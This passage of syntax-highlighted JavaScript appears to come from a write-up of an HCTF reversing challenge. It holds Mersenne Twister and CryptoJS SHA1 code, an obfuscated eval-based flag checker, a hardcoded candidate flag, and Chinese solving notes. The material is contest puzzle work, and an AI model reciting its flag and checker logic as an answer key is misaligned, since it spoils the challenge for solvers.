class="keyword">this</span>.mt[<span class="keyword">this</span>.M<span class="number">-1</span>] ^ (y &gt;&gt;&gt; <span class="number">1</span>) ^ mag01[y &amp; <span class="number">0x1</span>];</div><div class="line">    <span class="keyword">this</span>.mti = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  y = <span class="keyword">this</span>.mt[<span class="keyword">this</span>.mti++];</div><div class="line">  <span class="comment">/* Tempering */</span></div><div class="line">  y ^= (y &gt;&gt;&gt; <span class="number">11</span>);</div><div class="line">  y ^= (y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>;</div><div class="line">  y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>;</div><div class="line">  y ^= (y &gt;&gt;&gt; <span class="number">18</span>);</div><div class="line">  <span class="keyword">return</span> y &gt;&gt;&gt; <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* generates a random number on [0,0x7fffffff]-interval */</span></div><div class="line">MersenneTwister.prototype.genrand_int31 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> (<span class="keyword">this</span>.genrand_int32()&gt;&gt;&gt;<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* generates a random number on [0,1]-real-interval */</span></div><div class="line">MersenneTwister.prototype.genrand_real1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.genrand_int32()*(<span class="number">1.0</span>/<span class="number">4294967295.0</span>);</div><div class="line">  <span class="comment">/* divided by 2^32-1 */</span></div><div class="line">&#125;</div><div class="line"><span class="comment">/* generates a random number on [0,1)-real-interval */</span></div><div class="line">MersenneTwister.prototype.random = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.genrand_int32()*(<span class="number">1.0</span>/<span class="number">4294967296.0</span>);</div><div class="line">  <span class="comment">/* divided by 2^32 */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* generates a random number on (0,1)-real-interval */</span></div><div class="line">MersenneTwister.prototype.genrand_real3 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> (<span class="keyword">this</span>.genrand_int32() + <span class="number">0.5</span>)*(<span class="number">1.0</span>/<span class="number">4294967296.0</span>);</div><div class="line">  <span class="comment">/* divided by 2^32 */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* generates a random number on [0,1) with 53-bit resolution*/</span></div><div class="line">MersenneTwister.prototype.genrand_res53 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> a=<span class="keyword">this</span>.genrand_int32()&gt;&gt;&gt;<span class="number">5</span>, b=<span class="keyword">this</span>.genrand_int32()&gt;&gt;&gt;<span class="number">6</span>;</div><div class="line">  <span class="keyword">return</span>(a*<span class="number">67108864.0</span>+b)*(<span class="number">1.0</span>/<span class="number">9007199254740992.0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment">/*</span></div><div class="line">CryptoJS v3.1.2</div><div class="line">code.google.com/p/crypto-js</div><div class="line">(c) 2009-2013 by Jeff Mott. All rights reserved.</div><div class="line">code.google.com/p/crypto-js/wiki/License</div><div class="line">*/</div><div class="line"><span class="keyword">var</span> CryptoJS=CryptoJS||<span class="function"><span class="keyword">function</span>(<span class="params">e,m</span>)</span>&#123;<span class="keyword">var</span> p=&#123;&#125;,j=p.lib=&#123;&#125;,l=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,f=j.Base=&#123;<span class="attr">extend</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;l.prototype=<span class="keyword">this</span>;<span class="keyword">var</span> c=<span class="keyword">new</span> l;a&amp;&amp;c.mixIn(a);c.hasOwnProperty(<span class="string">"init"</span>)||(c.init=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;c.$<span class="keyword">super</span>.init.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>)&#125;);c.init.prototype=c;c.$<span class="keyword">super</span>=<span class="keyword">this</span>;<span class="keyword">return</span> c&#125;,<span class="attr">create</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=<span class="keyword">this</span>.extend();a.init.apply(a,<span class="built_in">arguments</span>);<span class="keyword">return</span> a&#125;,<span class="attr">init</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,<span class="attr">mixIn</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> c <span class="keyword">in</span> a)a.hasOwnProperty(c)&amp;&amp;(<span class="keyword">this</span>[c]=a[c]);a.hasOwnProperty(<span class="string">"toString"</span>)&amp;&amp;(<span class="keyword">this</span>.toString=a.toString)&#125;,<span class="attr">clone</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>.init.prototype.extend(<span class="keyword">this</span>)&#125;&#125;,</div><div class="line">n=j.WordArray=f.extend(&#123;<span class="attr">init</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a,c</span>)</span>&#123;a=<span class="keyword">this</span>.words=a||[];<span class="keyword">this</span>.sigBytes=c!=m?c:<span class="number">4</span>*a.length&#125;,<span class="attr">toString</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">return</span>(a||h).stringify(<span class="keyword">this</span>)&#125;,<span class="attr">concat</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">var</span> c=<span class="keyword">this</span>.words,q=a.words,d=<span class="keyword">this</span>.sigBytes;a=a.sigBytes;<span class="keyword">this</span>.clamp();<span class="keyword">if</span>(d%<span class="number">4</span>)<span class="keyword">for</span>(<span class="keyword">var</span> b=<span class="number">0</span>;b&lt;a;b++)c[d+b&gt;&gt;&gt;<span class="number">2</span>]|=(q[b&gt;&gt;&gt;<span class="number">2</span>]&gt;&gt;&gt;<span class="number">24</span><span class="number">-8</span>*(b%<span class="number">4</span>)&amp;<span class="number">255</span>)&lt;&lt;<span class="number">24</span><span class="number">-8</span>*((d+b)%<span class="number">4</span>);<span class="keyword">else</span> <span class="keyword">if</span>(<span class="number">65535</span>&lt;q.length)<span class="keyword">for</span>(b=<span class="number">0</span>;b&lt;a;b+=<span class="number">4</span>)c[d+b&gt;&gt;&gt;<span class="number">2</span>]=q[b&gt;&gt;&gt;<span class="number">2</span>];<span class="keyword">else</span> c.push.apply(c,q);<span class="keyword">this</span>.sigBytes+=a;<span class="keyword">return</span> <span class="keyword">this</span>&#125;,<span class="attr">clamp</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=<span class="keyword">this</span>.words,c=<span class="keyword">this</span>.sigBytes;a[c&gt;&gt;&gt;<span class="number">2</span>]&amp;=<span class="number">4294967295</span>&lt;&lt;</div><div class="line"><span class="number">32</span><span class="number">-8</span>*(c%<span class="number">4</span>);a.length=e.ceil(c/<span class="number">4</span>)&#125;,<span class="attr">clone</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=f.clone.call(<span class="keyword">this</span>);a.words=<span class="keyword">this</span>.words.slice(<span class="number">0</span>);<span class="keyword">return</span> a&#125;,<span class="attr">random</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> c=[],b=<span class="number">0</span>;b&lt;a;b+=<span class="number">4</span>)c.push(<span class="number">4294967296</span>*e.random()|<span class="number">0</span>);<span class="keyword">return</span> <span class="keyword">new</span> n.init(c,a)&#125;&#125;),b=p.enc=&#123;&#125;,h=b.Hex=&#123;<span class="attr">stringify</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">var</span> c=a.words;a=a.sigBytes;<span class="keyword">for</span>(<span class="keyword">var</span> b=[],d=<span class="number">0</span>;d&lt;a;d++)&#123;<span class="keyword">var</span> f=c[d&gt;&gt;&gt;<span class="number">2</span>]&gt;&gt;&gt;<span class="number">24</span><span class="number">-8</span>*(d%<span class="number">4</span>)&amp;<span class="number">255</span>;b.push((f&gt;&gt;&gt;<span class="number">4</span>).toString(<span class="number">16</span>));b.push((f&amp;<span class="number">15</span>).toString(<span class="number">16</span>))&#125;<span class="keyword">return</span> b.join(<span class="string">""</span>)&#125;,<span class="attr">parse</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> c=a.length,b=[],d=<span class="number">0</span>;d&lt;c;d+=<span class="number">2</span>)b[d&gt;&gt;&gt;<span class="number">3</span>]|=<span class="built_in">parseInt</span>(a.substr(d,</div><div class="line"><span class="number">2</span>),<span class="number">16</span>)&lt;&lt;<span class="number">24</span><span class="number">-4</span>*(d%<span class="number">8</span>);<span class="keyword">return</span> <span class="keyword">new</span> n.init(b,c/<span class="number">2</span>)&#125;&#125;,g=b.Latin1=&#123;<span class="attr">stringify</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">var</span> c=a.words;a=a.sigBytes;<span class="keyword">for</span>(<span class="keyword">var</span> b=[],d=<span class="number">0</span>;d&lt;a;d++)b.push(<span class="built_in">String</span>.fromCharCode(c[d&gt;&gt;&gt;<span class="number">2</span>]&gt;&gt;&gt;<span class="number">24</span><span class="number">-8</span>*(d%<span class="number">4</span>)&amp;<span class="number">255</span>));<span class="keyword">return</span> b.join(<span class="string">""</span>)&#125;,<span class="attr">parse</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> c=a.length,b=[],d=<span class="number">0</span>;d&lt;c;d++)b[d&gt;&gt;&gt;<span class="number">2</span>]|=(a.charCodeAt(d)&amp;<span class="number">255</span>)&lt;&lt;<span class="number">24</span><span class="number">-8</span>*(d%<span class="number">4</span>);<span class="keyword">return</span> <span class="keyword">new</span> n.init(b,c)&#125;&#125;,r=b.Utf8=&#123;<span class="attr">stringify</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">escape</span>(g.stringify(a)))&#125;<span class="keyword">catch</span>(c)&#123;<span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Malformed UTF-8 data"</span>);&#125;&#125;,<span class="attr">parse</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">return</span> g.parse(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(a)))&#125;&#125;,</div><div class="line">k=j.BufferedBlockAlgorithm=f.extend(&#123;<span class="attr">reset</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">this</span>._data=<span class="keyword">new</span> n.init;<span class="keyword">this</span>._nDataBytes=<span class="number">0</span>&#125;,<span class="attr">_append</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="string">"string"</span>==<span class="keyword">typeof</span> a&amp;&amp;(a=r.parse(a));<span class="keyword">this</span>._data.concat(a);<span class="keyword">this</span>._nDataBytes+=a.sigBytes&#125;,<span class="attr">_process</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">var</span> c=<span class="keyword">this</span>._data,b=c.words,d=c.sigBytes,f=<span class="keyword">this</span>.blockSize,h=d/(<span class="number">4</span>*f),h=a?e.ceil(h):e.max((h|<span class="number">0</span>)-<span class="keyword">this</span>._minBufferSize,<span class="number">0</span>);a=h*f;d=e.min(<span class="number">4</span>*a,d);<span class="keyword">if</span>(a)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> g=<span class="number">0</span>;g&lt;a;g+=f)<span class="keyword">this</span>._doProcessBlock(b,g);g=b.splice(<span class="number">0</span>,a);c.sigBytes-=d&#125;<span class="keyword">return</span> <span class="keyword">new</span> n.init(g,d)&#125;,<span class="attr">clone</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=f.clone.call(<span class="keyword">this</span>);</div><div class="line">a._data=<span class="keyword">this</span>._data.clone();<span class="keyword">return</span> a&#125;,<span class="attr">_minBufferSize</span>:<span class="number">0</span>&#125;);j.Hasher=k.extend(&#123;<span class="attr">cfg</span>:f.extend(),<span class="attr">init</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">this</span>.cfg=<span class="keyword">this</span>.cfg.extend(a);<span class="keyword">this</span>.reset()&#125;,<span class="attr">reset</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;k.reset.call(<span class="keyword">this</span>);<span class="keyword">this</span>._doReset()&#125;,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">this</span>._append(a);<span class="keyword">this</span>._process();<span class="keyword">return</span> <span class="keyword">this</span>&#125;,<span class="attr">finalize</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;a&amp;&amp;<span class="keyword">this</span>._append(a);<span class="keyword">return</span> <span class="keyword">this</span>._doFinalize()&#125;,<span class="attr">blockSize</span>:<span class="number">16</span>,<span class="attr">_createHelper</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">c,b</span>)</span>&#123;<span class="keyword">return</span>(<span class="keyword">new</span> a.init(b)).finalize(c)&#125;&#125;,<span class="attr">_createHmacHelper</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">b,f</span>)</span>&#123;<span class="keyword">return</span>(<span class="keyword">new</span> s.HMAC.init(a,</div><div class="line">f)).finalize(b)&#125;&#125;&#125;);<span class="keyword">var</span> s=p.algo=&#123;&#125;;<span class="keyword">return</span> p&#125;(<span class="built_in">Math</span>);</div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> e=CryptoJS,m=e.lib,p=m.WordArray,j=m.Hasher,l=[],m=e.algo.SHA1=j.extend(&#123;<span class="attr">_doReset</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">this</span>._hash=<span class="keyword">new</span> p.init([<span class="number">1732584193</span>,<span class="number">4023233417</span>,<span class="number">2562383102</span>,<span class="number">271733878</span>,<span class="number">3285377520</span>])&#125;,<span class="attr">_doProcessBlock</span>:<span class="function"><span class="keyword">function</span>(<span class="params">f,n</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> b=<span class="keyword">this</span>._hash.words,h=b[<span class="number">0</span>],g=b[<span class="number">1</span>],e=b[<span class="number">2</span>],k=b[<span class="number">3</span>],j=b[<span class="number">4</span>],a=<span class="number">0</span>;<span class="number">80</span>&gt;a;a++)&#123;<span class="keyword">if</span>(<span class="number">16</span>&gt;a)l[a]=f[n+a]|<span class="number">0</span>;<span class="keyword">else</span>&#123;<span class="keyword">var</span> c=l[a<span class="number">-3</span>]^l[a<span class="number">-8</span>]^l[a<span class="number">-14</span>]^l[a<span class="number">-16</span>];l[a]=c&lt;&lt;<span class="number">1</span>|c&gt;&gt;&gt;<span class="number">31</span>&#125;c=(h&lt;&lt;<span class="number">5</span>|h&gt;&gt;&gt;<span class="number">27</span>)+j+l[a];c=<span class="number">20</span>&gt;a?c+((g&amp;e|~g&amp;k)+<span class="number">1518500249</span>):<span class="number">40</span>&gt;a?c+((g^e^k)+<span class="number">1859775393</span>):<span class="number">60</span>&gt;a?c+((g&amp;e|g&amp;k|e&amp;k)<span class="number">-1894007588</span>):c+((g^e^</div><div class="line">k)<span class="number">-899497514</span>);j=k;k=e;e=g&lt;&lt;<span class="number">30</span>|g&gt;&gt;&gt;<span class="number">2</span>;g=h;h=c&#125;b[<span class="number">0</span>]=b[<span class="number">0</span>]+h|<span class="number">0</span>;b[<span class="number">1</span>]=b[<span class="number">1</span>]+g|<span class="number">0</span>;b[<span class="number">2</span>]=b[<span class="number">2</span>]+e|<span class="number">0</span>;b[<span class="number">3</span>]=b[<span class="number">3</span>]+k|<span class="number">0</span>;b[<span class="number">4</span>]=b[<span class="number">4</span>]+j|<span class="number">0</span>&#125;,<span class="attr">_doFinalize</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> f=<span class="keyword">this</span>._data,e=f.words,b=<span class="number">8</span>*<span class="keyword">this</span>._nDataBytes,h=<span class="number">8</span>*f.sigBytes;e[h&gt;&gt;&gt;<span class="number">5</span>]|=<span class="number">128</span>&lt;&lt;<span class="number">24</span>-h%<span class="number">32</span>;e[(h+<span class="number">64</span>&gt;&gt;&gt;<span class="number">9</span>&lt;&lt;<span class="number">4</span>)+<span class="number">14</span>]=<span class="built_in">Math</span>.floor(b/<span class="number">4294967296</span>);e[(h+<span class="number">64</span>&gt;&gt;&gt;<span class="number">9</span>&lt;&lt;<span class="number">4</span>)+<span class="number">15</span>]=b;f.sigBytes=<span class="number">4</span>*e.length;<span class="keyword">this</span>._process();<span class="keyword">return</span> <span class="keyword">this</span>._hash&#125;,<span class="attr">clone</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> e=j.clone.call(<span class="keyword">this</span>);e._hash=<span class="keyword">this</span>._hash.clone();<span class="keyword">return</span> e&#125;&#125;);e.SHA1=j._createHelper(m);e.HmacSHA1=j._createHmacHelper(m)&#125;)();</div><div class="line"><span class="comment">/* These real versions are due to Isaku Wada, 2002/01/09 added */</span></div><div class="line"><span class="built_in">Array</span>.prototype.includes||(<span class="built_in">Array</span>.prototype.includes=<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="string">"use strict"</span>;<span class="keyword">var</span> b=<span class="built_in">Object</span>(<span class="keyword">this</span>),c=<span class="built_in">parseInt</span>(b.length)||<span class="number">0</span>;<span class="keyword">if</span>(<span class="number">0</span>===c)<span class="keyword">return</span>!<span class="number">1</span>;<span class="keyword">var</span> e,d=<span class="built_in">parseInt</span>(<span class="built_in">arguments</span>[<span class="number">1</span>])||<span class="number">0</span>;d&gt;=<span class="number">0</span>?e=d:(e=c+d,<span class="number">0</span>&gt;e&amp;&amp;(e=<span class="number">0</span>));<span class="keyword">for</span>(<span class="keyword">var</span> f;c&gt;e;)&#123;<span class="keyword">if</span>(f=b[e],a===f||a!==a&amp;&amp;f!==f)<span class="keyword">return</span>!<span class="number">0</span>;e++&#125;<span class="keyword">return</span>!<span class="number">1</span>&#125;);</div><div class="line"><span class="keyword">var</span> _ = &#123; <span class="number">0x4c19cff</span>: <span class="string">"random"</span>, <span class="number">0x4728122</span>: <span class="string">"charCodeAt"</span>, <span class="number">0x2138878</span>: <span class="string">"substring"</span>, <span class="number">0x3ca9c7b</span>: <span class="string">"toString"</span>, <span class="number">0x574030a</span>: <span class="string">"eval"</span>, <span class="number">0x270aba9</span>: <span class="string">"indexOf"</span>, <span class="number">0x221201f</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_9</span>) </span>&#123; <span class="keyword">var</span> _8 = []; <span class="keyword">for</span> (<span class="keyword">var</span> _a = <span class="number">0</span>, _b = _9.length; _a &lt; _b; _a++) &#123; _8.push(<span class="built_in">Number</span>(_9.charCodeAt(_a)).toString(<span class="number">16</span>)); <span class="built_in">console</span>.log(<span class="string">"_8:"</span>+_8);&#125; <span class="keyword">return</span> <span class="string">"0x"</span> + _8.join(<span class="string">""</span>); &#125;, <span class="number">0x240cb06</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_2, _3</span>) </span>&#123; <span class="keyword">var</span> _4 = <span class="built_in">Math</span>.max(_2.length, _3.length); <span class="keyword">var</span> _7 = _2 + _3; <span class="keyword">var</span> _6 = <span class="string">""</span>; <span class="keyword">for</span>(<span class="keyword">var</span> _5=<span class="number">0</span>; _5&lt;_4; _5++) &#123; _6 += _7.charAt((_2.charCodeAt(_5%_2.length) ^ _3.charCodeAt(_5%_3.length)) % _4); &#125; <span class="keyword">return</span> _6; &#125;, <span class="number">0x5c623d0</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_c, _d</span>) </span>&#123; <span class="keyword">var</span> _e = <span class="string">""</span>; <span class="keyword">for</span>(<span class="keyword">var</span> _f=<span class="number">0</span>; _f&lt;_d; _f++) &#123; _e += _c; &#125; <span class="keyword">return</span> _e; &#125; &#125;;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(_)</div><div class="line">           <span class="comment">//var _ = &#123; 0x4c19cff: "random", 0x4728122: "charCodeAt", 0x2138878: "substring", 0x3ca9c7b: "toString", 0x574030a: "eval", 0x270aba9: "indexOf", 0x221201f: function(_9) &#123; var _8 = []; for (var _a = 0, _b = _9.length; _a &lt; _b; _a++) &#123; _8.push(Number(_9.charCodeAt(_a)).toString(16)); &#125; return "0x" + _8.join(""); &#125;, 0x240cb06: function(_2, _3) &#123; var _4 = Math.max(_2.length, _3.length); var _7 = _2 + _3; var _6 = ""; for(var _5=0; _5&lt;_4; _5++) &#123; _6 += _7.charAt((_2.charCodeAt(_5%_2.length) ^ _3.charCodeAt(_5%_3.length)) % _4); &#125; return _6; &#125;, 0x5c623d0: function(_c, _d) &#123; var _e = ""; for(var _f=0; _f&lt;_d; _f++) &#123; _e += _c; &#125; return _e; &#125; &#125;;</span></div><div class="line">  <span class="keyword">var</span> $ = [ <span class="number">0x4c19cff</span>, <span class="number">0x3cfbd6c</span>, <span class="number">0xb3f970</span>, <span class="number">0x4b9257a</span>, <span class="number">0x1409cc7</span>, <span class="number">0x46e990e</span>, <span class="number">0x2138878</span>, <span class="number">0x1e1049</span>, <span class="number">0x164a1f9</span>, <span class="number">0x494c61f</span>, <span class="number">0x490f545</span>, <span class="number">0x51ecfcb</span>, <span class="number">0x4c7911a</span>, <span class="number">0x29f7b65</span>, <span class="number">0x4dde0e4</span>, <span class="number">0x49f889f</span>, <span class="number">0x5ebd02c</span>, <span class="number">0x556f342</span>, <span class="number">0x3f7f3f6</span>, <span class="number">0x11544aa</span>, <span class="number">0x53ed47d</span>, <span class="number">0x697a</span>, <span class="number">0x623f21c1</span>, <span class="number">0x5c623d0</span>, <span class="number">0x32e8f8b</span>, <span class="number">0x3ca9c7b</span>, <span class="number">0x367a49b</span>, <span class="number">0x360179b</span>, <span class="number">0x5c862d6</span>, <span class="number">0x30dc1af</span>, <span class="number">0x7797d1</span>, <span class="number">0x221201f</span>, <span class="number">0x5eb4345</span>, <span class="number">0x5e9baad</span>, <span class="number">0x39b3b47</span>, <span class="number">0x32f0b8f</span>, <span class="number">0x48554de</span>, <span class="number">0x3e8b5e8</span>, <span class="number">0x5e4f31f</span>, <span class="number">0x48a53a6</span>, <span class="number">0x270aba9</span>, <span class="number">0x240cb06</span>, <span class="number">0x574030a</span>, <span class="number">0x1618f3a</span>, <span class="number">0x271259f</span>, <span class="number">0x3a306e5</span>, <span class="number">0x1d33b46</span>, <span class="number">0x17c29b5</span>, <span class="number">0x1cf02f4</span>, <span class="number">0xeb896b</span> ];</div><div class="line">  <span class="built_in">console</span>.log($)</div><div class="line">  <span class="keyword">var</span> a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="comment">//var answer = document.getElementById("message").value;</span></div><div class="line">      <span class="keyword">var</span> answer = <span class="string">"hctf&#123;wh3r3_iz_y0ur_neee3eeed??&#125;"</span>;</div><div class="line">      <span class="keyword">var</span> correct = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">          <span class="keyword">try</span> &#123;</div><div class="line">              h = <span class="keyword">new</span> MersenneTwister(<span class="built_in">parseInt</span>(btoa(answer[_[$[<span class="number">6</span>]]](<span class="number">0</span>, <span class="number">4</span>)), <span class="number">32</span>));</div><div class="line">              e = h[_[$[<span class="string">""</span>+ +[]]]]()*(<span class="string">""</span>+&#123;&#125;)[_[<span class="number">0x4728122</span>]](<span class="number">0xc</span>); <span class="keyword">for</span>(<span class="keyword">var</span> _1=<span class="number">0</span>; _1&lt;h.mti; _1++) &#123; e ^= h.mt[_1]; &#125;</div><div class="line">              l = <span class="keyword">new</span> MersenneTwister(e), v = <span class="literal">true</span>;</div><div class="line">              l.random(); l.random(); l.random();</div><div class="line">              o = answer.split(<span class="string">"_"</span>);</div><div class="line">              i = l.mt[~~(h.random()*$[<span class="number">0x1f</span>])%<span class="number">0xff</span>];</div><div class="line">              <span class="comment">// 在这里曾经耽误了很长时间，一直以为i应该是正数，因为如果i是负数，下边的s[0]就会是 "0x-xxxxxxx"这种形式的，而我自己在做异或的时候，将s[0]的值取出来做，所以会出现0x(－个负数)与另外一个数做异或。报错。其实这里的s[0]的类型是一个string.所以正负不会影响。</span></div><div class="line">              s = [<span class="string">"0x"</span> + i[_[$[$.length/<span class="number">2</span>]]](<span class="number">0x10</span>), <span class="string">"0x"</span> + e[_[$[$.length/<span class="number">2</span>]]](<span class="number">0o20</span>).split(<span class="string">"-"</span>)[<span class="number">1</span>]];</div><div class="line">              <span class="comment">//console.log(typeof(s[0]))</span></div><div class="line">              <span class="comment">// console.log((this[_[$[42]]](_[$[31]](o[1])) ^ s[0]))</span></div><div class="line">              e =- (<span class="keyword">this</span>[_[$[<span class="number">42</span>]]](_[$[<span class="number">31</span>]](o[<span class="number">1</span>])) ^ s[<span class="number">0</span>]); <span class="keyword">if</span> (-e != $[<span class="number">21</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">              <span class="comment">// console.log("$[22]:" + $[22])</span></div><div class="line">              <span class="comment">// console.log(e ^ -$[22] ^ s[1])</span></div><div class="line">              <span class="comment">//console.log("chars:" + typeof(this[_[$[42]]](_[$[31]](o[2]))))</span></div><div class="line">              e ^= (<span class="keyword">this</span>[_[$[<span class="number">42</span>]]](_[$[<span class="number">31</span>]](o[<span class="number">2</span>])) ^ s[<span class="number">1</span>]); <span class="built_in">console</span>.log(-e);<span class="keyword">if</span> (-e != $[<span class="number">22</span>]) <span class="keyword">return</span> <span class="literal">false</span>; e -= <span class="number">0x352c4a9b</span>;</div><div class="line">              <span class="comment">//到这里就可以将 o[1],o[2]两个值算出来。</span></div><div class="line"></div><div class="line">              t = <span class="keyword">new</span> MersenneTwister(<span class="built_in">Math</span>.sqrt(-e));</div><div class="line">              h.random();</div><div class="line">              a = l.random();</div><div class="line">              t.random();</div><div class="line">              y = [ <span class="number">0xb3f970</span>, <span class="number">0x4b9257a</span>, <span class="number">0x46e990e</span> ].map(<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123; <span class="keyword">return</span> $[_[$[<span class="number">40</span>]]](i)+ +<span class="number">1</span>+ <span class="number">-1</span>- +<span class="number">1</span>; &#125;);</div><div class="line">              o[<span class="number">0</span>] = o[<span class="number">0</span>].substring(<span class="number">5</span>); o[<span class="number">3</span>] = o[<span class="number">3</span>].substring(<span class="number">0</span>, o[<span class="number">3</span>].length - <span class="number">1</span>);</div><div class="line">              <span class="comment">// 把'hctf&#123;' 与 '&#125;' 过滤</span></div><div class="line">              u = ~~~~~~~~~~~~~~~~(a * i);</div><div class="line">              <span class="built_in">console</span>.log(<span class="string">"a:"</span>+a);</div><div class="line">              <span class="built_in">console</span>.log(<span class="string">"i:"</span>+i);</div><div class="line">              <span class="keyword">if</span> (o[<span class="number">0</span>].length &gt; <span class="number">5</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">              a = <span class="built_in">parseInt</span>(_[$[<span class="number">23</span>]](<span class="string">"1"</span>, <span class="built_in">Math</span>.max(o[<span class="number">0</span>].length, o[<span class="number">3</span>].length)), <span class="number">3</span>) ^  <span class="built_in">eval</span>(_[$[<span class="number">31</span>]](o[<span class="number">0</span>]));</div><div class="line">              <span class="comment">// 8位</span></div><div class="line"></div><div class="line">              <span class="comment">// 以3进制转换 o&#123;0&#125;,o&#123;1&#125;中最长的与 o&#123;1&#125;做异或</span></div><div class="line">              r = (h.random() * l.random() * t.random()) / (h.random() * l.random() * t.random());</div><div class="line">              e ^= ~r;</div><div class="line">              r = (h.random() / l.random() / t.random()) / (h.random() * l.random() * t.random());</div><div class="line">              e ^= ~~r;</div><div class="line">              a += _[$[<span class="number">31</span>]](o[<span class="number">3</span>].substring(o[<span class="number">3</span>].length - <span class="number">2</span>)).split(<span class="string">"x"</span>)[<span class="number">1</span>];</div><div class="line">              <span class="comment">// 取 0xafaf 0x后边的数</span></div><div class="line">              <span class="keyword">if</span> (<span class="built_in">parseInt</span>(a.split(<span class="string">"84"</span>)[<span class="number">1</span>], $.length/<span class="number">2</span>) != <span class="number">0x4439feb</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">              d = <span class="built_in">parseInt</span>(a, <span class="number">16</span>) == (<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">16</span>)+ <span class="number">-5</span>+ <span class="string">""</span>) + o[<span class="number">3</span>].charCodeAt(o[<span 